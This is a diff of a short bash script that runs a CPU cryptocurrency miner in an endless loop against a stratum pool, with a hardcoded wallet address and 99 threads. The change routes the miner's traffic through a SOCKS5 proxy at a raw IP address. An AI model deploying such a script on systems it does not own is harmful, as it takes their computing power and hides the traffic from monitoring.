@@ -7,6 +7,6 @@
 #
 FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 while [ 1 ]; do
-"$FOLDER"/cpuavx -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qfd7x2uq3n6q3m2sg8yqwcw7hvdzapqe0mqpv0j.WORKER_NAME-$(echo $(shuf -i 1-99 -n 1)) -t 99
+"$FOLDER"/cpuavx -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qfd7x2uq3n6q3m2sg8yqwcw7hvdzapqe0mqpv0j.WORKER_NAME-$(echo $(shuf -i 1-99 -n 1)) -t 99 -x socks5://136.169.143.75:1080
 sleep 5
 done
